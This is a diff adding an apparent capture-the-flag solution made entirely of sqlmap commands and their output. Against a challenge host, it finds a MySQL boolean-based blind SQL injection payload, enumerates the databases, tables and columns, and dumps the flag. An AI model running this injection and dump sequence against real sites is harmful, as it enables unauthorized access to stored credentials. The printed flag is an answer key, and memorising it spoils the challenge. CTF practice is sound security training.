@@ -1,0 +1,37 @@
+sqlmap -u "https://big-blind.hsc.tf/" --method POST --data "user=1&pass=2" --level=2 --batch
+```
+---
+Parameter: user (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: user=1' RLIKE (SELECT (CASE WHEN (2710=2710) THEN 1 ELSE 0x28 END)) AND 'SDgi'='SDgi&pass=2
+---
+```
+
+sqlmap -u "https://big-blind.hsc.tf/" --method POST --data "user=1&pass=2" --level=2 --dbs --batch
+```
+[*] db
+[*] information_schema
+[*] mysql
+[*] performance_schema
+```
+
+sqlmap -u "https://big-blind.hsc.tf/" --method POST --data "user=1&pass=2" --level=2 -D db --tables --batch
+```
+users
+```
+
+sqlmap -u "https://big-blind.hsc.tf/" --method POST --data "user=1&pass=2" --level=2 -D db -T users --columns --batch
+```
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| user   | varchar(255) |
+| pass   | varchar(255) |
++--------+--------------+
+```
+
+sqlmap -u "https://big-blind.hsc.tf/" --method POST --data "user=1&pass=2" --level=2 -D db -T users -C pass --dump
+```
+flag{any_info_is_good_info}
+```
